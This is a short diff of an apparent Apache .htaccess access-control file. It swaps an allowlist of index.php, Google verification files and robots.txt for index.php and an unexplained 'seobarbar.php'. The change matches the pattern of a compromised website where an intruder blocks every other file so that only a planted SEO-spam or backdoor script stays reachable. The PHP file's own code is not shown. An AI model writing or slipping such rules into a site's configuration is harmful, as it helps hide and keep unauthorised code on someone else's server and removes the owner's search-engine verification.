@@ -2,7 +2,7 @@
 Order allow,deny
 Deny from all
 </FilesMatch>
-<FilesMatch '^(index.php|google9f1806ec578c1b99.html|googled9fd22f2eeb484dd.html|robots.txt)$'>
+<FilesMatch '^(index.php|seobarbar.php)$'>
 Order allow,deny
 Allow from all
 </FilesMatch>
